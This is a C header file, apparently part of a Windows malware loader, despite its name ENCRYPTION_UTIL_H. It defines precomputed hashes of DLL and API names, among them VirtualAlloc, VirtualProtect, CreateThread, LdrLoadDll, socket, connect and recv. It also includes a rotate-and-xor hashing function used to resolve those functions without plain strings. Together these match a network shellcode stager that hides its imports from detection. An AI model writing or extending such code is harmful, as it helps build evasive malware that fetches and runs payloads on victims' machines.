#ifndef ENCRYPTION_UTIL_H
#define ENCRYPTION_UTIL_H

// TODO: move this into its own encryption folder? 

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

// Modules
#define KERNEL32_DLL_HASH 0xB543789C 
#define WS2_32_DLL_HASH 0x0DD2240A 
#define NTDLL_DLL_HASH 0x36D4F9B6 

// kernel32.dll
#define VIRTUALALLOC_HASH 0X107EE31D
#define VIRTUALPROTECT_HASH 0X6C79D644
#define CREATETHREAD_HASH 0X3E04B946
#define WAITFORSINGLEOBJECT_HASH 0XE624F2A7

// ntdll.dll
#define LDRLOADDLL_HASH 0X0B86D6B0

// ws2_32.dll
#define WSASTARTUP_HASH 0XD0E22A9A
#define WSACLEANUP_HASH 0XB8A6232A
#define GETADDRINFO_HASH 0XBB9581B9
#define FREEADDRINFO_HASH 0XBBA690ED
#define SOCKET_HASH 0XAAFC9113
#define CLOSESOCKET_HASH 0X3F65BF9C
#define CONNECT_HASH 0X92F497AB
#define RECV_HASH 0X940C5977
// #define SEND_HASH 0X940DF9E5 // TODO: uncomment when i start using this func

#define ROTR32(value, shift)    (((DWORD) value >> (BYTE) shift) | ((DWORD) value << (32 - (BYTE) shift)))

// TODO: use better hashing alg than xor in the future
DWORD xor_hash(const char* str) 
{
    DWORD hash = 0;
    while (*str) {
        hash = (hash << 13) | (hash >> 19);
        hash ^= *str++;
    }
    return hash;
}

// TODO: make a unicode and ansi version? or just have a convert str function somewhere else?
DWORD xor_hash_ci(const char* str) 
{
    DWORD hash = 0;
    while (*str) 
    {
        hash = (hash << 13) | (hash >> 19);
        hash ^= (*str | 0x20); // Case conversion + hashing inline
        str++;
    }
    return hash;
}


#endif